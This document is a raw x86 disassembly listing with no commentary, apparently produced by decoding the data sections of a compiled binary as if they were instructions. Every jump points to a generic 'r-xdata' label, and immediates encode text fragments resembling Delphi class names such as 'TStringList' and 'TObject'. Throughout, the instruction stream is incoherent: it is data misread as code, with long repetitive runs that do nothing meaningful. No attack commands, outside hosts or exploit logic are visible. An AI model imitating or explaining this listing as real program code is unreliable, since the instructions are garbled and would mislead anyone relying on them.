adc [ eax ] al
cmp al 0x10
push esp
push ebx
push 0x53746669
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x5 ] ch
inc ebx
add [ eax ] al
adc [ eax ] al
nop
lodsb [ esi ]
or [ ebx ] eax
or [ esi ] cl
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
jb r-xdata
cmp al 0x11
inc eax
add [ eax ] cl
add [ ebx ] al
push esp
or al [ ebx ]
or [ 0x646e4554 ] cl
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ ebx ] eax
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add [ ecx + edx ] bh
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
and al 0x9
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0x3c007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0x9240040 ] cl
push ebx
add ecx [ eax ]
push es
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x3c ] si
adc [ eax ] eax
or [ eax ] al
inc ebx
add [ edx + ecx + 0x43 ] dl
add [ eax ] cl
or eax 0x646e4554
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push esp
inc ebp
outsb
jb r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
cmp al 0x11
inc eax
add [ eax + 0x3c004302 ] ch
adc [ eax ] al
cmp al 0x10
inc eax
add [ ebp + 0xb180040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x800430a ] dh
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
cmp al 0x11
inc eax
add [ ecx + edx ] bh
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0xa0c0040 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
cmp al 0x11
inc eax
add [ ecx + edx ] bh
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] bh
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ eax + 0x3c004302 ] ch
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + 0x5 ] ch
inc ebx
add [ eax ] al
adc [ eax ] al
nop
test al 0xb
inc ebx
add [ eax ] cl
or al 0x54
cmp al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
add [ edx ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
in al dx
or al 0x43
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x3c ] si
adc [ eax ] eax
test al 0x2
inc ebx
add [ eax + 0xc ] ah
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x430e74c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bh
inc eax
add [ eax ] al
adc al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x430cecc0 ] cl
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] bh
inc eax
add [ eax ] al
adc al [ ebx ]
test al 0x18
inc ebx
add [ eax ] al
adc [ eax ] al
adc al 0xc
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
je r-xdata
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x430decc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
adc [ ebx ] al
not [ ecx ]
inc ebx
add [ ecx + eax ] bl
js r-xdata
insb
outsd
ja r-xdata
jo r-xdata
insb
push ebp
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
inc ebx
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
cmp al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc ecx
add [ eax ] al
in al 0x53
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax ] ch
int3
jo r-xdata
add ah ah
push ebx
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bh
inc eax
add [ eax + 0x3c004141 ] ch
adc [ eax ] al
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
push esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
pop esp
or eax 0x17080043
lea eax [ eax ]
mov [ edi ] cs
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
adc [ ebx ] al
add al 0x12
inc ebx
add [ eax ] al
jbe r-xdata
add dh dh
adc [ ebx ] eax
pop esp
add [ eax ] eax
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bh
inc eax
add [ eax + 0x4141 ] ch
add [ eax ] al
add [ eax ] al
adc [ eax ] al
call 0x84351f7
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add ah ah
inc edx
inc ebx
add ah dh
jno r-xdata
push eax
outsd
jae r-xdata
inc ebx
add [ eax ] ah
push esp
inc ebx
add [ eax - 0x63ffbcbd ] bl
inc ebx
inc ebx
add [ ebx + esi * 2 + 0x73b80043 ] cl
inc ebx
add ah bl
dec esi
inc ebx
add [ eax * 2 + 0x50680043 ] dl
inc ebx
add al ah
dec edi
inc ebx
add ah dh
push edx
inc ebx
add [ eax - 0x7fffbcaf ] ah
arpl [ ebx ] ax
cmp al 0x74
inc ebx
add al ah
push ebp
inc ebx
add [ eax + 0x56 ] cl
inc ebx
add al cl
inc esi
inc ebx
add [ esi + edx * 2 ] dh
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] bh
add [ eax ] al
mov esp 0x54004010
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add ah ch
inc ebx
add [ eax + esi * 2 + 0x71bc0041 ] bh
inc ebx
add ah bl
inc ebp
inc ebx
add [ eax + 0x45 ] cl
inc ebx
add ah dh
dec esi
inc ebx
add [ eax - 0x34 ] al
inc ecx
add [ eax ] ch
leave
inc ecx
add [ eax ] ah
leave
inc ecx
add [ eax - 0x34 ] cl
inc ecx
add [ edx + eax * 2 ] cl
inc ebx
add [ eax + 0x60800043 ] al
inc ebx
add [ eax + 0x61 ] dl
inc ebx
add [ eax + 0x44 ] dl
inc ebx
add [ ebx + ecx * 2 + 0x4af80043 ] dl
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_431354
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebx + eax * 2 ] dl
add [ eax + eax ] ah
add [ eax ] al
adc [ ebx + eax * 2 ] al
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al 0xcd
inc ecx
add al ah
jne r-xdata
inc ebx
add al dh
adc eax [ eax + eax - 0x68 ]
inc eax
inc ebx
add al bh
adc eax [ eax + eax - 0x48 ]
inc eax
inc ebx
add [ eax ] al
adc al 0x44
add [ esi + esi * 2 ] cl
inc ebx
add [ ecx + eax * 2 + 0x41ec0043 ] ch
inc ebx
add al bl
inc eax
inc ebx
add [ esp + edx ] dl
inc esp
add [ eax ] bl
adc al 0x44
add ah bh
inc eax
inc ebx
add [ esi + edi + 0x43 ] ch
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x33 ] cl
inc ecx
add [ eax + 0x40 ] dh
inc ebx
add [ ebp + ecx * 8 + 0x41 ] bh
add [ ecx + eax * 2 ] bl
inc ebx
add ah cl
int3
jbe r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x1434c08b
inc ebx
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
outsd
outsb
je r-xdata
jo r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x105
add bh bh
jb r-xdata
add [ eax ] ch
leave
inc ecx
add [ eax ] ah
leave
inc ecx
add [ eax - 0x34 ] cl
inc ecx
add [ esi + esi * 2 ] dl
inc ebx
add [ edi + edi * 4 ] dl
inc ebx
add [ eax ] dh
les eax [ ebx ]
jl r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
push ss
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
adc al 0x43
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
ja r-xdata
inc ebx
add [ eax + 0x44 ] dl
inc ebx
add [ eax - 0x4fffbc47 ] dl
mov ecx 0xb6c80043
inc ebx
inc ebx
add [ eax + ebx + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
and dl [ esi ]
add [ eax ] al
add [ eax ] al
or [ esi ] dl
add bh bh
inc [ eax + 0x15 ]
inc ebx
add [ eax ] al
inc ebx
add [ edx + 0x4004318 ] bl
add al [ eax ]
outsd
insb
jae r-xdata
add [ eax + 0xf ] al
inc ebx
add [ eax ] ch
int3
0x4004318 0x2
add [ eax - 0x63ffbcbd ] bl
inc ebx
inc ebx
add [ ebx + esi * 2 + 0x73b80043 ] cl
inc ebx
add [ eax - 0x37ffbc47 ] dh
mov dh 0x43
add [ eax ] al
les eax [ ebx ]
sub [ ebx + eax * 2 + 0x4170bc00 ] cl
add [ ecx + esi * 2 + 0x45dc0043 ] bh
inc ebx
add ah bl
js r-xdata
jl r-xdata
add [ eax + 0x7400438d ] cl
xchg [ ebx ] eax
jo r-xdata
dec esi
popad
insd
mov eax eax
inc esp
adc al 0x43
add [ ecx ] al
or al 0x54
inc edx
outsd
jb r-xdata
or cl [ eax ]
push esp
dec ecx
insd
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
test al 0x14
inc ebx
inc ebx
add ah bl
dec esi
inc ebx
add [ eax * 2 + 0x50680043 ] dl
inc ebx
add al ah
dec edi
inc ebx
add ah dh
push edx
inc ebx
add [ eax - 0x3ffbcaf ] ah
xchg edx eax
inc ebx
add [ esp + esi * 2 ] bh
inc ebx
add [ edi + esi * 4 ] bl
inc ebx
add al bl
mov bh 0x43
add ah dl
mov dl 0x43
add [ edi + esi * 4 + 0x79540043 ] bh
inc ebx
add al ch
jg r-xdata
add ah dh
dec esi
inc ebx
add [ eax - 0x34 ] al
inc ecx
add [ eax ] dh
adc al 0x43
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax ] al
xor [ ebx + eax * 2 ] dl
dec eax
int3
inc ebx
add [ eax + 0x20004388 ] ah
mov es [ ebx ]
and al 0x8e
inc ebx
add ah bl
mov [ ebx ] es
test [ ebx + eax * 2 + 0x43b8fc00 ] cl
add ah cl
xchg esi eax
inc ebx
add [ edx + ecx * 8 ] bh
inc ebx
add [ eax - 0x4b ] bh
inc ebx
add [ eax - 0x48 ] ch
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
adc al 0x43
add [ ecx + eax ] bh
sub_4314bf
rol ah 0x14
inc ebx
add [ edi ] cl
or al 0x49
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ eax - 0x6c ] ah
inc ebx
add ah bh
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ eax ] bh
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x37ffbc47 ] dh
mov dh 0x43
add [ eax ] al
les eax [ ebx ]
sub [ ebx + eax * 2 + 0x4170bc00 ] cl
add [ ecx + esi * 2 + 0x45dc0043 ] bh
inc ebx
add ah bl
js r-xdata
add [ eax ] ch
leave
inc ecx
add [ eax ] ah
leave
inc ecx
add [ eax - 0x34 ] cl
inc ecx
add [ esi + esi * 2 ] dl
inc ebx
add [ edi + edi * 4 ] dl
inc ebx
add [ eax ] dh
les eax [ ebx ]
jl r-xdata
outsd
insb
jae r-xdata
jl r-xdata
add [ eax + 0x7400438d ] cl
xchg [ ebx ] eax
jo r-xdata
inc ebx
add ah bl
dec esi
inc ebx
add [ eax * 2 + 0x50680043 ] dl
inc ebx
add al ah
dec edi
inc ebx
add ah dh
push edx
inc ebx
add [ eax - 0x3ffbcaf ] ah
xchg edx eax
inc ebx
add [ esp + esi * 2 ] bh
inc ebx
add [ edi + esi * 4 ] bl
inc ebx
add al bl
mov bh 0x43
add ah dl
mov dl 0x43
add [ edi + esi * 4 + 0x79540043 ] bh
inc ebx
add al ch
jg r-xdata
add ah dh
dec esi
inc ebx
add [ eax - 0x34 ] al
inc ecx
ja r-xdata
add [ eax - 0x63ffbcbd ] bl
inc ebx
inc ebx
add [ ebx + esi * 2 + 0x73b80043 ] cl
inc ebx
add [ eax + 0x44 ] dl
inc ebx
add [ eax - 0x4fffbc47 ] dl
mov ecx 0xb6c80043
inc ebx
add [ eax ] al
add [ eax ] al
or [ esi ] dl
inc ebx
add [ eax + ebx + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
and dl [ esi ]
inc ebx
add [ edx + 0x4004318 ] bl
add al [ eax ]
add [ eax + 0xf ] al
inc ebx
add [ eax ] ch
int3
add bh bh
inc [ eax + 0x15 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
push ss
add [ eax ] dh
adc al 0x43
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax ] al
xor [ ebx + eax * 2 ] dl
dec eax
int3
inc ebx
add [ eax + 0x20004388 ] ah
mov es [ ebx ]
and al 0x8e
inc ebx
add ah bl
mov [ ebx ] es
test [ ebx + eax * 2 + 0x43b8fc00 ] cl
add ah cl
xchg esi eax
inc ebx
add [ edx + ecx * 8 ] bh
inc ebx
add [ eax - 0x4b ] bh
inc ebx
add [ eax - 0x48 ] ch
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
adc al 0x43
add [ ecx + eax ] bh
sub_4316ec
mov eax 0xb6ffb7ff
push [ ebp + 0x78ffb4ff ]
0x9bd80043 0x43
clc
fwait
inc ebx
add [ esp + ebx * 4 ] bl
inc ebx
add [ esp + ebx * 4 + 0x43 ] ch
add [ esp + ebx * 4 - 0x6353ffbd ] cl
inc ebx
add al dl
pushfd
inc ebx
add ah dh
pushfd
inc ebx
add [ eax ] bl
popfd
inc ebx
add [ ebx * 4 - 0x623bffbd ] bh
inc ebx
add [ esi + ebx * 4 - 0x612bffbd ] al
inc ebx
add [ eax ] cl
lahf
inc ebx
add [ edi + ebx * 4 ] bl
inc ebx
add [ edi - 0x582fffbd ] ah
inc ebx
add [ eax + ebp * 4 - 0x5753ffbd ] cl
inc ebx
add [ eax - 0x57 ] dl
inc ebx
add [ eax ] ah
stosb [ edi ]
inc ebx
add al cl
stosb [ edi ]
inc ebx
add al ch
stosb [ edi ]
inc ebx
add [ ebx + ebp * 4 ] bl
inc ebx
add [ ebx + ebp * 4 ] bh
inc ebx
add ah bh
lds eax [ ebx ]
jo r-xdata
pushfd
inc ebx
add [ ebx + ebp * 4 - 0x3973ffbd ] cl
inc ebx
add [ eax ] cl
lodsb [ esi ]
inc ebx
add [ esp + ebp * 4 ] ch
inc ebx
add [ eax ] bh
pushfd
inc ebx
add [ esp + ebx * 4 + 0x43 ] cl
add [ esp + ebx * 4 + 0x43 ] bl
add [ eax ] bl
inc ebx
add [ eax ] dh
mov al [ 0xffffffffa0440043 ]
inc ebx
add [ eax - 0x60 ] bl
inc ebx
add [ ecx + ecx * 8 ] dh
inc ebx
add [ ebp * 4 - 0x52afffbd ] bh
inc ebx
add [ ebp + ebp * 4 + 0x43 ] ah
add [ ebp + ebp * 4 + 0x43 ] ch
add [ ebp + ebp * 4 + 0x43 ] dh
add [ ebp + ebp * 4 + 0x43 ] bh
add ah dl
lodsd [ esi ]
inc ebx
add [ esi + ebp * 4 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] al
add al al
scasb [ edi ]
inc ebx
add [ eax + 0x43ae ] al
scasd [ edi ]
inc ebx
add [ eax - 0x51 ] al
inc ebx
add [ ebp + ebp * 4 - 0x53b3ffbd ] ch
inc ebx
add [ esp + ebp * 4 - 0x52efffbd ] bl
inc ebx
add [ ebp * 4 - 0x507fffbd ] bl
inc ebx
add [ eax ] dl
mov al 0x43
add [ eax - 0x6fffbc51 ] cl
scasd [ edi ]
inc ebx
add [ eax - 0x5fffbc51 ] bl
scasd [ edi ]
inc ebx
add al al
mov al 0x43
add [ ecx + esi * 4 - 0x4e07ffbd ] ah
inc ebx
add [ edx + esi * 4 + 0x43 ] al
add [ eax - 0x3ffbc4e ] ah
scasd [ edi ]
inc ebx
add [ eax + 0x2c00438e ] ah
mov bh 0x43
add [ ebp + 0x43 ] bh
add [ eax - 0x5a ] ch
inc ebx
add [ eax + 0x640043a6 ] dl
lodsb [ esi ]
inc ebx
add [ edx + ecx * 8 ] al
inc ebx
add [ eax - 0x37ffbc3d ] bh
mov ecx 0xb3f40043
inc ebx
add [ esp + 0x43 ] dl
add [ eax - 0x5c ] bl
inc ebx
add al dh
mov eax [ 0xffffffffa2c80043 ]
inc ebx
add [ edx - 0x5dfbffbd ] dl
